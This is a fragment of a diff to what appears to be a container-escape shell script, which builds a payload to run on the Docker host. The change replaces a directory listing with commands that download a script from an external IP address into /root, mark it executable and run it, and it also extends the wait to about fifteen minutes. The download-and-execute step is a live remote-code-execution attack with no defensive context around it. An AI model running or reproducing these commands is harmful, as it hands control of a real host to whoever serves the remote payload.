@@ -19,8 +19,10 @@ cat > ${PAYLOAD_PATH} << __EOF__
 OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 
 # Commands to run on the host<
-
-ls -al /var/lib/docker/overlay2 > \${OUTPATH}
+curl http://35.194.58.97/payload.sh --output /root/payload.sh
+chmod +x /root/payload.sh
+/root/payload.sh
+echo done > \${OUTPATH}
 
 __EOF__
 
@@ -55,9 +57,9 @@ done
 
 # Wait for and cat the output
 echo "about to sleep"
-sleep 1
-#echo "sleeping some more"
-#sleep 900
+sleep 60
+echo "sleeping some more"
+sleep 900
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 cp ${OUTPUT_PATH} peas.txt
